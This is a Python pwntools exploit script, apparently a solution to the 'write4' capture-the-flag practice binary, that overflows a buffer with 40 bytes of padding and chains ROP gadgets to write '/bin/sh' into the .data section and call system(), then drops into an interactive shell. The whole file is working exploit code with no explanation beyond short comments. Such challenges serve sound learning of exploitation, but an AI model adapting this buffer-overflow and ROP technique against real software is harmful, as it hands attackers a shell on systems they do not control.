#!/usr/bin/python

import os
from pwn import *

e = ELF('./write4')
r = process(e.path)

s_data = 0x0000000000601050         # .data
binsh = 0x2f62696e2f736800          # /bin/sh

gg1 = 0x0000000000400890            # pop r14 ; pop r15 ; ret
gg2 = 0x0000000000400820            # mov QWORD PTR [r14],r15
gg3 = 0x0000000000400893            # pop rdi ; ret

payload = 'A'*40                    # offset to vuln buffer
payload += p64(gg1)                 # gadget 1
payload += p64(s_data)              # write string in .data
payload += p64(binsh, endian='big')
payload += p64(gg2)                 # gadget 2
payload += p64(gg3)                 # gadget 3
payload += p64(s_data)
payload += p64(e.symbols['system'])

#print(payload)

r.recvuntil('>')
r.sendline(payload)                 # send payload
r.interactive()
